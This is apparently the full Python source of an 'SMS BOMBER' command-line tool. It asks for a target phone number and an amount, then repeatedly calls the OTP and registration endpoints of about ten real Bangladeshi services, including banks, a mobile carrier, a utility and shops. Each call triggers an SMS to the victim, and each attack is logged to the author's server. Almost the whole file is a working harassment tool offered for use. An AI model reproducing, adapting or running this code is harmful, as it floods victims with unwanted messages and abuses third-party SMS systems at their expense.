# Codded By Ariful Islam Arman (ARU)
# writen With python
import os
import time
import json
import sys
import random
import string
import webbrowser
import uuid
# color
# Color Value
blueVal = "94m"
redVal = "91m"
greenVal = "32m"
whiteVal = "97m"
yellowVal = "93m"
cyanVal = "96m"
# normal
normal = "\33["
# Bold
bold = "\033[1;"
# italic
italic = "\x1B[3m"
# Color Normal
blue = normal + blueVal  # Blue Color Normal
red = normal + redVal  # Red Color Normal
green = normal + greenVal  # Green Color Normal
white = normal + whiteVal  # white Color Normal
yellow = normal + yellowVal  # yellow Color Normal
cyan = normal + cyanVal  # Cyan Color Normal
# Color Bold
blueBold = bold + blueVal  # Blue Color Bold
redBold = bold + redVal  # Red Color Bold
greenBold = bold + greenVal  # Green Color Bold
whiteBold = bold + whiteVal  # white Color Bold
yellowBold = bold + yellowVal  # yellow Color Bold
cyanBold = bold + cyanVal  # Cyan Color Bold
version = "2.1.7"
# oparetor
robi = "018"
airtel = "016"
grameenohone = "017"
grameenohone_miror = "013"
banglalink = "019"
banglalink_miror = "019"
teletalk = "015"
global oparetor
global number, country_valid, amount, choosed
# color end
end = '\033[0m'
colorArr = ["\033[1;91m", "\033[1;92m", "\033[1;93m",
            "\033[1;94m", "\033[1;95m", "\033[1;96m"]
missbehaviorArray = ["sawa", "saua", "heda", "hda", "sona", "voda"]
# Char Print
def printchar(w, t):  # w=word and t =time
    for word in w + '\n':
        sys.stdout.write(word)
        sys.stdout.flush()
        time.sleep(t)
# clear screen
def clr():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')
# declare file path
present_dir = os.getcwd()
if (os.name == "nt"):
    new_path = '.users\.data\.verify\.users'
else:
    new_path = '.users/.data/.verify/.users'
path = os.path.join(present_dir, new_path)
if (os.name == "nt"):
    new_path = '.users\.data\.verify\.users\.id.txt'
else:
    new_path = '.users/.data/.verify/.users/.id.txt'
pathID = os.path.join(present_dir, new_path)
def fb():
    if os.name == 'nt':
        webbrowser.open('https://www.facebook.com/Aru.Ofc/')
        sys.exit()
    else:
        os.system('xdg-open https://www.facebook.com/Aru.Ofc/')
        sys.exit()
def github():
    if os.name == 'nt':
        webbrowser.open('https://github.com/Aru-Ofc-git/')
        sys.exit()
    else:
        os.system('xdg-open https://github.com/Aru-Ofc-git/')
        sys.exit()
def chat():
    if os.name == 'nt':
        webbrowser.open('https://m.me/1R13A14')
        sys.exit()
    else:
        os.system('xdg-open https://m.me/1R13A14')
        sys.exit()

def insta():
    if os.name == 'nt':
        webbrowser.open('https://www.instagram.com/aru.ofc.ins/')
        sys.exit()
    else:
        os.system('xdg-open https://www.instagram.com/aru.ofc.ins/')
        sys.exit()
def yt():
    if os.name == 'nt':
        webbrowser.open(' https://youtube.com/c/ARULyrics1')
    else:
        os.system('xdg-open  https://youtube.com/c/ARULyrics1')
# Import All Module
try:
    import requests
except:
    printchar(cyanBold + "installing requests.....", 0.05)
    time.sleep(2)
    os.system("pip install requests")
    import requests
    printchar(greenBold + "requests successfully installed.....", 0.05)
    time.sleep(2)
    os.system('clear')
def banner():
    a = random.choice(colorArr)
    r = random.choice(colorArr)
    u = random.choice(colorArr)
    logo = f'''

{a}	 █████╗   {r}  ██████╗  {u}   ██╗   ██╗
{a}	██╔══██╗  {r}  ██╔══██╗ {u}   ██║   ██║
{a}	███████║  {r}  ██████╔╝ {u}   ██║   ██║
{a}	██╔══██║  {r}  ██╔══██╗ {u}   ██║   ██║
{a}	██║  ██║  {r}  ██║  ██║ {u}   ╚██████╔╝
{a}	╚═╝  ╚═╝  {r}  ╚═╝  ╚═╝ {u}    ╚═════╝ 
	'''
    infoC = random.choice(colorArr)
    toolsInfo = f'''{infoC}
    ╔════════════════════════════════════╗
    ║             {random.choice(colorArr)}SMS BOMBER {infoC}            ║
    ║     {random.choice(colorArr)}AUTHOR: ARIFUL ISLAM ARMAN {infoC}    ║
    ║           {random.choice(colorArr)}VERSION : {version}  {infoC}        ║
    ║          {random.choice(colorArr)} STATUS : FREE    {infoC}        ║
    ╚════════════════════════════════════╝
    '''
    clr()
    print(logo)
    print(toolsInfo)
def bannerSentPin():
    a = random.choice(colorArr)
    r = random.choice(colorArr)
    u = random.choice(colorArr)
    logo = f'''

{a}	 █████╗   {r}  ██████╗  {u}   ██╗   ██╗
{a}	██╔══██╗  {r}  ██╔══██╗ {u}   ██║   ██║
{a}	███████║  {r}  ██████╔╝ {u}   ██║   ██║
{a}	██╔══██║  {r}  ██╔══██╗ {u}   ██║   ██║
{a}	██║  ██║  {r}  ██║  ██║ {u}   ╚██████╔╝
{a}	╚═╝  ╚═╝  {r}  ╚═╝  ╚═╝ {u}    ╚═════╝ 
	'''
    infoC = random.choice(colorArr)
    toolsInfo = f'''{infoC}
    ╔════════════════════════════════════╗
    ║             {random.choice(colorArr)}SMS BOMBER {infoC}            ║
    ║     {random.choice(colorArr)}AUTHOR: ARIFUL ISLAM ARMAN {infoC}    ║
    ║           {random.choice(colorArr)}VERSION : {version}  {infoC}        ║
    ╚════════════════════════════════════╝
    '''
    os.chdir(path)
    gName = open('.name.txt', 'r')
    getName = gName.read()
    gName.close()
    gPhone = open('.number.txt', 'r')
    getPhone = gPhone.read()
    gPhone.close()
    UserInfo = f'''{cyanBold}
         Name: {yellowBold}{getName}
         {cyanBold}Number: {yellowBold}+88 {getPhone}
       '''
    clr()
    print(logo)
    print(toolsInfo)
    print(UserInfo)
def bannerLoggedIn():
    a = random.choice(colorArr)
    r = random.choice(colorArr)
    u = random.choice(colorArr)
    logo = f'''

{a}	 █████╗   {r}  ██████╗  {u}   ██╗   ██╗
{a}	██╔══██╗  {r}  ██╔══██╗ {u}   ██║   ██║
{a}	███████║  {r}  ██████╔╝ {u}   ██║   ██║
{a}	██╔══██║  {r}  ██╔══██╗ {u}   ██║   ██║
{a}	██║  ██║  {r}  ██║  ██║ {u}   ╚██████╔╝
{a}	╚═╝  ╚═╝  {r}  ╚═╝  ╚═╝ {u}    ╚═════╝ 
	'''
    infoC = random.choice(colorArr)
    toolsInfo = f'''{infoC}
    ╔════════════════════════════════════╗
    ║             {random.choice(colorArr)}SMS BOMBER {infoC}            ║
    ║     {random.choice(colorArr)}AUTHOR: ARIFUL ISLAM ARMAN {infoC}    ║
    ║           {random.choice(colorArr)}VERSION : {version}  {infoC}        ║
    ╚════════════════════════════════════╝
    '''
    os.chdir(path)
    gName = open('.name.txt', 'r')
    getName = gName.read()
    gName.close()
    gPhone = open('.number.txt', 'r')
    getPhone = gPhone.read()
    gPhone.close()
    UserInfo = f'''{cyanBold}
         Name: {yellowBold}{getName}
         {cyanBold}Number: {yellowBold}+88 {getPhone}
       '''
    clr()
    print(logo)
    print(toolsInfo)
    printchar(UserInfo, 0.03)
optionsLoggedIn = f'''{random.choice(colorArr)}
    [1] Start Bombing
    [2] Your Profile
    [3] Connect with Us
'''
connectOptions = '''
    [1] GitHub
    [2] Facebook
    [3] Chat with admin
    [4] Instagram
    [5] YouTube    
'''
# connect
def connect():
    time.sleep(1)
    clr()
    banner()
    printchar(random.choice(colorArr) + connectOptions, 0.005)
    inputConnectOption = str(input(random.choice(
        colorArr) + "    [>] Chosse a Option: " + random.choice(colorArr)))
    if inputConnectOption == "1":
        github()
        time.sleep(5)
        sys.exit()
    elif inputConnectOption == "2":
        fb()
        time.sleep(5)
        sys.exit()
    elif inputConnectOption == "3":
        chat()
        time.sleep(5)
        sys.exit()
    elif inputConnectOption == "4":
        insta()
        time.sleep(5)
        sys.exit()
    elif inputConnectOption == "5":
        yt()
        time.sleep(5)
        sys.exit()
    else:
        printchar(redBold + "\n    Invalid input", 0.01)
        time.sleep(4)
        connect()
# profile
def profile():
    bannerLoggedIn()
    os.chdir(path)
    gPhone = open('.number.txt', 'r')
    getPhone = gPhone.read()
    gPhone.close()
    historyUrl = "https://aru-bomber.vercel.app/history"
    headers = {"Content-Type": "application/json"}
    data = '{"number":"'+getPhone+'"}'
    history = requests.post(historyUrl, data=data, headers=headers)
    headText = f'''{greenBold}
    ╔════════════════════════════════════╗
    ║           {random.choice(colorArr)}BOMBING HISTORY{greenBold}          ║
    '''
    footerBackspace = "\b\b\b\b"
    print(headText, end="")
    if (len(history.json()["bombingData"]) == 0):
        notFoundText = f'''║     {redBold}        NOT FOUND       {greenBold}       ║
        '''
        footerBackspace = ""
        print(notFoundText, end="")
        pass
    else:
        for i in range(len(history.json()["bombingData"])):
            if (i >= 1):
                backSpace = "\b\b\b\b\b\b\b\b"
            else:
                backSpace = ""
                pass
            if (int(history.json()['bombingData'][i]['attackAmount'] <= 9)):
                amountPrint = str(
                    history.json()['bombingData'][i]['attackAmount'])+"  "
                pass
            elif (int(history.json()['bombingData'][i]['attackAmount'] <= 99)):
                amountPrint = str(
                    history.json()['bombingData'][i]['attackAmount'])+" "
                pass
            else:
                amountPrint = str(
                    history.json()['bombingData'][i]['attackAmount'])
                pass
            print(f'''{backSpace}{greenBold}║    {yellowBold}╔═══════════════════════════╗   {greenBold}║
   {greenBold} ║  {yellowBold}  ║  {greenBold}Number: {cyanBold}+88 {history.json()['bombingData'][i]['victimNumber']} {yellowBold} ║  {greenBold} ║
    ║    {yellowBold}║ {greenBold} Amount:{cyanBold} {amountPrint}  {yellowBold}            ║   {greenBold}║
    ║    {yellowBold}╚═══════════════════════════╝   {greenBold}║
            ''', end="")
    footerText = f'''\b\b\b\b{footerBackspace}╚════════════════════════════════════╝'''
    print(footerText)
def register():
    while True:
        banner()
        name = str(input(greenBold+"    Enter Your Full Name: "))
        if (not name):
            printchar(f"{redBold}    Please Enter Your Name", 0.03)
            time.sleep(3)
            continue
        if (name in missbehaviorArray):
            printchar(
                f'{redBold}    Your name is not allowed. Somehow \n    You used this name we suspend your \n    account without any warning.', 0.02)
            time.sleep(3)
            continue
        else:
            break
    while True:
        banner()
        number = str(input(greenBold+"    Enter Your Number: "))
        if (not number):
            printchar(f"{redBold}    Please Enter Your Number", 0.03)
            time.sleep(3)
            continue
        if (len(number) != 11):
            printchar(f"{redBold}    Please Enter Correct Number", 0.03)
            time.sleep(3)
            continue
        else:
            urlOtp = "https://aru-bomber.vercel.app/api/register/sendOtp"
            headers = {"Content-Type": "application/json"}
            data = '{"number":"'+number+'"}'
            sendOtp = requests.post(urlOtp, headers=headers, data=data)
            if (sendOtp.json()["message"] == "OTP Send."):
                printchar(
                    f'{greenBold}    We sent a OTP in your number.', 0.03)
                time.sleep(4)
                break
            else:
                printchar(f'{redBold}    {sendOtp.json()["message"]}', 0.03)
                time.sleep(5)
                continue
    while True:
        banner()
        otp = str(input(greenBold+"    Enter Your OTP: "))
        if (not otp):
            printchar(f"{redBold}    Please Enter OTP", 0.03)
            time.sleep(3)
            continue
        if (len(otp) != 6):
            printchar(f"{redBold}    OTP Must Be 6 Digit", 0.03)
            time.sleep(3)
            continue
        else:
            break
    while True:
        banner()
        password = str(input(greenBold+"    Enter Your Password: "))
        if (not password):
            printchar(f"{redBold}    Please Enter Password", 0.03)
            time.sleep(3)
            continue
        elif (len(password) < 6):
            printchar(f"{redBold}    Password Minimum length 6 digit", 0.03)
            time.sleep(3)
        else:
            break

    registerUrl = "https://aru-bomber.vercel.app/register"
    headers = {"Content-Type": "application/json"}
    data = '{"name":"'+name+'", "number":"'+number + \
        '", "otp":"'+otp+'","password":"'+password+'"}'
    try:
        registerUser = requests.post(registerUrl, data=data, headers=headers)
    except Exception as err:
        print(redBold+err)
        sys.exit()
    if (registerUser.json()["message"] == "User Created"):
        present_dir = os.getcwd()
        if (os.name == "nt"):
            new_path = '.users\.data\.verify\.users'
        else:
            new_path = '.users/.data/.verify/.users'
        path = os.path.join(present_dir, new_path)
        if os.path.exists(path):
            os.chdir(path)
            try:
                createNameFile = open('.name.txt', 'x')
                createNameFile.close()
                createNumberFile = open('.number.txt', 'x')
                createNumberFile.close()
                createIdFile = open('.id.txt', 'x')
                createIdFile.close()
            except Exception as err:
                print(err)
                sys.exit()
        else:
            try:
                os.makedirs(path)
                os.chdir(path)
                createNameFile = open('.name.txt', 'x')
                createNameFile.close()
                createNumberFile = open('.number.txt', 'x')
                createNumberFile.close()
                createIdFile = open('.id.txt', 'x')
                createIdFile.close()
            except Exception as err:
                print(err)
        userId = registerUser.json()["id"]
        name = registerUser.json()["name"]
        phone = registerUser.json()["number"]
        try:
            # save name in storage
            createNameFile = open('.name.txt', 'w')
            createNameFile.write(str(name))
            createNameFile.close()
            # save number in storage
            createNumberFile = open('.number.txt', 'w')
            createNumberFile.write(str(number))
            createNumberFile.close()
            # Save id in storage
            createIdFile = open('.id.txt', 'w')
            createIdFile.write(str(userId))
            createIdFile.close()
            loggedIn()
        except Exception as error:
            print(error)
    else:
        printchar(f'{redBold}    {registerUser.json()["message"]} ', 0.03)
def login():
    while True:
        banner()
        number = str(input(greenBold+"    Enter Your Number: "))
        if (not number):
            printchar(f"{redBold}    Please Enter Your Number", 0.03)
            time.sleep(3)
            continue
        if (len(number) != 11):
            printchar(f"{redBold}    Please Enter Correct Number", 0.03)
            time.sleep(3)
            continue
        else:
            break
    while True:
        banner()
        password = str(input(greenBold+"    Enter Your Password: "))
        if (not password):
            printchar(f"{redBold}    Please Enter Password", 0.03)
            time.sleep(3)
            continue
        elif (len(password) < 6):
            printchar(
                f"{redBold}    Password Minimum length 6 character", 0.03)
            time.sleep(3)
            continue
        else:
            # requ api
            urlLogin = "https://aru-bomber.vercel.app/login"
            headers = {"Content-Type": "application/json"}
            data = '{"number":"'+number+'","password":"'+password+'"}'

            try:
                requLogin = requests.post(urlLogin, data=data, headers=headers)
            except Exception as err:
                print(redBold+err)
                sys.exit()
            if (requLogin.json()["message"] == "Valid User"):
                present_dir = os.getcwd()
                if (os.name == "nt"):
                    new_path = '.users\.data\.verify\.users'
                else:
                    new_path = '.users/.data/.verify/.users'
                path = os.path.join(present_dir, new_path)
                if os.path.exists(path):
                    os.chdir(path)
                    try:
                        createNameFile = open('.name.txt', 'x')
                        createNameFile.close()
                        createNumberFile = open('.number.txt', 'x')
                        createNumberFile.close()
                        createIdFile = open('.id.txt', 'x')
                        createIdFile.close()
                    except:
                        pass
                    pass
                else:
                    try:
                        os.makedirs(path)
                        os.chdir(path)
                        createNameFile = open('.name.txt', 'x')
                        createNameFile.close()
                        createNumberFile = open('.number.txt', 'x')
                        createNumberFile.close()
                        createIdFile = open('.id.txt', 'x')
                        createIdFile.close()
                    except Exception as err:
                        print(err)
                userId = requLogin.json()["id"]
                name = requLogin.json()["name"]
                phone = requLogin.json()["number"]
                try:
                    # save name in storage
                    createNameFile = open('.name.txt', 'w')
                    createNameFile.write(str(name))
                    createNameFile.close()
                    # save number in storage
                    createNumberFile = open('.number.txt', 'w')
                    createNumberFile.write(str(number))
                    createNumberFile.close()
                    # Save id in storage
                    createIdFile = open('.id.txt', 'w')
                    createIdFile.write(str(userId))
                    createIdFile.close()
                    loggedIn()
                    break
                except Exception as error:
                    print(error)
            else:
                printchar(f'{redBold}    {requLogin.json()["message"]}', 0.03)
                break
def loginOrRegister():
    banner()
    optionLoginOrRegis = greenBold+'''
    [1] Login
    [2] Register
    [3] Connect with us
    '''
    printchar(optionLoginOrRegis, 0.03)
    op = str(input(greenBold+"    Choose a option: "))
    if (op == "01" or op == "1"):
        login()
    elif (op == "02" or op == "2"):
        register()
    elif (op == "03" or op == "3"):
        connect()
    else:
        printchar(f'{redBold}    Please choose correct option', 0.03)
def sentPin(number, amount):
    amount = int(amount)
    bannerLoggedIn()
    os.chdir(path)
    gName = open('.name.txt', 'r')
    getName = gName.read()
    gName.close()
    gPhone = open('.number.txt', 'r')
    getPhone = gPhone.read()
    gPhone.close()
    try:
        urlStore = 'https://aru-bomber.vercel.app/storeBombingData'
        dataStore = '{"name":"'+getName+'","number":"'+getPhone+'","victim":"'+number+'","amount": '+str(amount)+'}'
        headersStore = {"Content-Type":"application/json"}
        req = requests.post(urlStore,headers=headersStore,data=dataStore)
    except Exception as err:
        print(err)
        sys.exit()
    try:
        time_s = requests.get(
            'https://raw.githubusercontent.com/Aru-Is-Always-King/bombing_data/main/time.txt').text
        time_speed = float(time_s)
    except Exception as err:
        print(err)
        sys.exit()
    i = 0
    print(f"{greenBold}   TOTAL SMS REQUESTS SENT: {cyanBold}", end="")
    while i < amount:
        number_without_zero = number[1:11]
        # REQUESTS
        # NESCO
        try:
            url_nesco = "http://nesco.sslwireless.com/api/v1/login"
            headers_nesco = {
                "Content-Type": "application/x-www-form-urlencoded"}
            data_nesco = "phone_number=" + number
            requ_nesco_server = requests.post(
                url_nesco, headers=headers_nesco, data=data_nesco)
            if requ_nesco_server.json()["message"] == "OTP has been Sent.":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # Sahjalal
        try:
            url_sahjalal = "https://eaccount.sjiblbd.com/VerifIDEXT/api/CustOnBoarding/VerifyMobileNumber"
            headers_sahjalal = {"Content-Type": "application/json", }
            data_sahjalal = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+number + \
                '","otpSms":"","product_id":"121","requestChannel":"MOB","trackingStatus":5}'
            requ_sahjalal_server = requests.post(
                url_sahjalal, headers=headers_sahjalal, data=data_sahjalal)
            if requ_sahjalal_server.json()['message'] == 'OTP Generated':
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # zdrop
        try:
            url_zdrop = "https://api.zdrop.com.bd/auth_service/auth"
            headers_zdrop = {"Content-Type": "application/json", }
            data_zdrop = '{"firstName":"Bug","lastName":"Test","mobileNumber":"' + \
                number+'","type":"customer"}'
            requ_zdrop_server = requests.post(
                url_zdrop, headers=headers_zdrop, data=data_zdrop)
            if requ_zdrop_server.json()['data'] == 'OTP Sent':
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # onlinesim
        try:
            url_onlinesim = "https://da-api.robi.com.bd/da-nll/otp/send"
            headers_onlinesim = {"Content-Type": "application/json", }
            data_onlinesim = '{"msisdn":"'+number+'"}'
            requ_onlinesim_server = requests.post(
                url_onlinesim, headers=headers_onlinesim, data=data_onlinesim)
            if requ_onlinesim_server.json()['status'] == 'SUCCESSFUL':
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # cinespot
        try:
            url_cinespot = "http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-"+number+"/operator-All/send"
            requ_cinespot_server = requests.get(url_cinespot)
            if requ_cinespot_server.json()['message'] == 'send':
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # nexus pay
        try:
            url_nexus = "https://nxpay.dutchbanglabank.com/user/register"
            headers_nexus = {
                        'X-Km-User-Mpaid': '',
                        'X-Km-User-Aspid': '5678',
                        'X-Km-Accept-Language': 'en',
                        'X-Km-Os-Service-Type': 'GMS',
                        'X-Versioncode': '100046112',
                        'X-Km-User-Agent': 'ANDROID/100046112',
                        'Content-Type': 'application/json; charset=UTF-8',
                        'Content-Length': '280',
                        'Accept-Encoding': 'gzip, deflate',
                        'User-Agent': 'okhttp/4.9.3',
                        'Connection': 'close'
                        }
            i += 1
            data_nexus = '{"aspId":"5678","dateOfBirth":null,"email":null,"gender":null,"locale":"EN","mnoName":"GrameenPhone","msisdn":"'+number + '","name":null,"nationality":null,"paymentPin":null,"registrationUserId":"01819400400","tcidList":[50],"telcoId":"RB","verificationData":null,"walletPin":null}'
            requ_nexus_server = requests.post(url_nexus, headers=headers_nexus, data=data_nexus)
            if requ_nexus_server.status_code == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # MOKAM
        try:
            url_mokam = "https://api-aru-bomber.000webhostapp.com/index.php?server=mokam&number="+number
            headers_mokam = {"Content-Type": "application/json"}
            requ_mokam_server = requests.post(url_mokam, headers=headers_mokam)
            if requ_mokam_server.json()["message"] == f"An OTP has been sent to 88{number}.":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        #shajgoj
        try:
            url_shajgoj = "https://api-aru-bomber.000webhostapp.com/index.php?server=shajgoj&number="+number
            headers_shajgoj = {"Content-Type": "application/json"}
            requ_shajgoj_server = requests.post(url_shajgoj, headers=headers_shajgoj)
            if requ_shajgoj_server.json()["msg"] == f"A One Time Passcode has been sent to 88{number}.":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # lanka
        try:
            url_lanka_bn2 = "https://www.lankabangla.com/personal-loan-application/upload.php?action=login"
            headers_lanka_bn2 = {
                "Content-Type": "application/x-www-form-urlencoded"}
            data_lanka_bn2 = "applicant_email=fuckYou@yahoo.com&applicant_mobile=" + \
                number+"&proceed=Proceed"
            requ_lanka_bn2_server = requests.post(
                url_lanka_bn2, headers=headers_lanka_bn2, data=data_lanka_bn2)
            if requ_lanka_bn2_server.text == "true":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # # TAP
        try:
            ID = uuid.uuid4()
            url_tap = "https://api.bdkepler.com/api_middleware-0.0.2-RELEASE/registration-generate-otp"
            headers_tap = {"Content-Type": "application/json"}
            data_tap = '{"deviceId":"' + \
                str(ID)+'","operator":"Robi","walletNumber":"'+number+'"}'
            requ_tap_server = requests.post(
                url_tap, headers=headers_tap, data=data_tap)
            if requ_tap_server.status_code == 200 and requ_tap_server.json()['statusCode'] == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
        # WEB
        try:
            url_web_one = "http://27.131.15.19/lstyle/api/lsotprequest"
            headers_web_one = {"Content-Type": "application/json"}
            data_web_one = '{"shortcode":"2494905","msisdn":"88' + number + '"}'
            requ_web_one_server = requests.post(url_web_one, headers=headers_web_one, data=data_web_one)
            if requ_web_one_server.json()["reponse"] == "SUCCESSFUL":
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
                time.sleep(time_speed)
                sys.stdout.write("\b" * len(print_text))
                if i == amount:
                    print("[" + str(i) + "]")
                    fb()
                    break
                else:
                    pass
            else:
                pass
        except:
            pass
def bombing():
    amountBuild = int(requests.get(
        'https://raw.githubusercontent.com/Aru-Is-Always-King/bombing_data/main/limit.txt').text)

    while True:
        bannerSentPin()
        number = str(input(greenBold+"    Enter Your Target Number: "))
        if (not number):
            printchar(f"{redBold}    Please Enter Your Number", 0.03)
            time.sleep(3)
            continue
        if (len(number) != 11):
            printchar(f"{redBold}    Please Enter Correct Number", 0.03)
            time.sleep(3)
            continue
        else:
            break
    while True:
        bannerSentPin()
        amount = str(
            input(greenBold+f"    Enter Amount [Max: {str(amountBuild)}]: "))
        if (not amount):
            printchar(f"{redBold}    Please Enter attack amount", 0.03)
            time.sleep(3)
            continue
        if (int(amount) > amountBuild):
            printchar(f"{redBold}    Please Enter Valid Amount", 0.03)
            time.sleep(3)
            continue
        else:
            break
    try:
        numbers = str.split(requests.get(
            'https://raw.githubusercontent.com/Aru-Is-Always-King/bombing_data/main/protract.txt').text)
    except Exception as err:
        print(redBold + err)
        sys.exit()
    if (number in numbers):
        bannerLoggedIn()
        printchar(f'{cyanBold}    This number is protected.', 0.03)
        sys.exit()
    else:
        sentPin(number, amount)
def loggedIn():
    if (os.path.isfile(pathID)):
        os.chdir(path)
        userIDg = open('.id.txt', 'r')
        userIDget = userIDg.read()
        userIDg.close()
        pass
    else:
        loginOrRegister()
    try:
        checkVelidity = requests.get(
            "https://aru-bomber.vercel.app/getUserStatusByID?id="+userIDget)
    except Exception as err:
        print(redBold + err)
        sys.exit()
    try:
        if (checkVelidity.json()["message"] == "User Found."):
            bannerLoggedIn()
            printchar(optionsLoggedIn, 0.03)
            option = str(input(greenBold+"    [>] Choose a option: "))
            if (not len(option)):
                printchar(
                    f'{redBold}    Please Choose a valid menu. Programme now stopped.', 0.03)
                sys.exit()
            if (option == "01" or option == "1"):
                bombing()
            elif (option == "02" or option == "2"):
                profile()
            elif (option == "03" or option == "3"):
                connect()
            else:
                printchar(
                    f'{redBold}    Please Choose a valid menu. Programme now stopped.', 0.03)
                sys.exit()
        else:
            banner()
            printchar(f'{redBold}    Account Suspended', 0.02)
    except:
        pass
def policy():
    clr()
    try:
        openPolicyfile = open('policy.txt','r')
        policyText = openPolicyfile.read()
        openPolicyfile.close()
    except Exception as err:
        print(redBold+ err)
        sys.exit()
    printchar(f'{whiteBold}{policyText}',0.03)
    agree = str(input(f'{whiteBold}Are you agree our policy [Y=Yes, N=No, Default=No]?'))
    if('y' in agree.lower() or 'yes' in agree.lower()):
        try:
            crateAgreeFile = open('.agree.txt','x')
            crateAgreeFile.write("yes")
            crateAgreeFile.close()
            main()
        except FileExistsError:
            openAgreeFile = open('.agree.txt','w')
            agreeText = openAgreeFile.write("yes")
            openAgreeFile.close()
            main()
            sys.exit()
    else:
        printchar(f'{redBold}You are not agreed.',0.03)
        sys.exit()
def main():
    # Check Tools
    if("active" in requests.get('https://raw.githubusercontent.com/Aru-Is-Always-King/bombing_data/main/active-v-2.1.7').text):
        pass
    else:
        printchar(f'{yellowBold}  {requests.get("https://raw.githubusercontent.com/Aru-Is-Always-King/bombing_data/main/message-v-2.1.7").text}', 0.005)
        sys.exit()
    # privacy and policy
    if(os.path.isfile('.agree.txt')):
        # read file
        openAgreeFile = open('.agree.txt','r')
        agreeText = openAgreeFile.read()
        openAgreeFile.close()
        if('yes' in agreeText):
            pass
        else:
            clr()
            printchar(f'{redBold}You are not agreed our policy.', 0.03)
            time.sleep(3)
            policy()
            sys.exit()
    else:
        policy()
        sys.exit()
    present_dir = os.getcwd()
    if (os.name == "nt"):
        new_path = '.users\.data\.verify\.users'
    else:
        new_path = '.users/.data/.verify/.users'
    path = os.path.join(present_dir, new_path)
    if (not os.path.exists(path)):
        loginOrRegister()
    try:
        os.chdir(path)
    except:
        loginOrRegister()
    if os.path.isfile(".id.txt") and os.path.isfile(".number.txt") and os.path.isfile(".name.txt"):
        loggedIn()
    else:
        loginOrRegister()